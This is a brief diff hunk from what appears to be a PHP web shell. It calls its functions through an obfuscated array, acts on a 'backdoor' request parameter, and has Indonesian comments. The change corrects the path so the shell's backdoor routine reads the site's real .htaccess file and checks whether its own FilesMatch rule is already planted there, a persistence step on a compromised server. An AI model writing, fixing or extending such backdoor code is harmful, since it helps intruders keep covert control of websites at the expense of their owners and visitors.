@@ -827,7 +827,7 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
 
 if ($_GET['backdoor'] == True) {
     // check if htaccess have this code
-    $file_htaccess = $fungsi[27]($_SERVER[$fungsi[33]] . "/htaccess");
+    $file_htaccess = $fungsi[27]($_SERVER[$fungsi[33]] . "/.htaccess");
     $cari_code = explode('<', $file_htaccess);
     if (!end($cari_code) == '/FilesMatch>') {
         // pengecekan nama file sekarang
